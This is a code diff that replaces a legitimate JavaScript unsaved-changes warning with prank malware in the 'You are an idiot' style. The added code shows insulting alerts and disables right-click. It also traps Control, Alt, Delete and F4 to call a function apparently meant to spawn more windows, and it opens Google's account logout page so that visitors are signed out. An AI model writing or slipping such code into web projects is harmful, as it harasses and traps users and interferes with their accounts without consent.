@@ -1,17 +1,14 @@
-var isDirty = function() { return false; }
-var formSubmitting = false;
-var setFormSubmitting = function() { formSubmitting = true; };
-window.onload = function() {
-    window.addEventListener("beforeunload", function (e) {
-        if (formSubmitting || !isDirty()) {
-            return undefined;
-        }
-        
-        var confirmationMessage = 'It looks like you have been editing something. '
-                                + 'If you leave before saving, your changes will be lost.';
+window.onbeforeunload = () => "Are you an idiot?";
+window.oncontextmenu = () => false;
+window.onkeydown = async () => {
+	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+		await proCreate(6);
+		alert("You are an idiot!");
+	}
+	
+	return null;
+}
 
-        (e || window.event).returnValue = confirmationMessage; //Gecko + IE
-        return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
-    });
-};
-    
+
+alert("YOU ARE AN IDIOT!! HGAHAHAHA");
+window.open("https://www.google.com/accounts/Logout","_blank")
